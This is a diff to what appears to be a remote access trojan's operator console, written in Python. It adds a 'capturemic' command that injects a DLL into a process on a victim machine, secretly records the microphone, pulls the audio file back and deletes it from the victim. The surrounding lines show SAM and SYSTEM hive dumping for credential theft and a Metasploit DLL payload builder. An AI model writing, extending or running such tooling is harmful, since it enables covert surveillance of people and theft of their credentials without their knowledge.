@@ -659,7 +659,19 @@ Open Ports
                            print("[+] Error dumping system.")
                     else:
                         print("[+] Error dumping sam.")
-                        
+                
+                elif(main == "capturemic"):
+                    seconds = input("[?] Recording time in seconds : ")
+                    SendPayloadCommand(seconds)
+                    DLLTransfer("payloads/capturemic.dll",setting('inject_process'))
+                    print("[+] Recording microphone input ...")
+                    time.sleep(int(seconds)+ 2)
+                    self.SendData("fupload:"+ hostList[location].split("/")[1].strip() + ".wav")
+                    self.WaitForReply()
+                    self.SendData("delete:"+hostList[location].split("/")[1].strip() + ".wav")
+                    self.WaitForReply()
+                    RemovePayloadCommand() # important
+                    
                 elif(main == "dropmsf"):
                     os.chdir("payloads")
                     build_msf_dll()
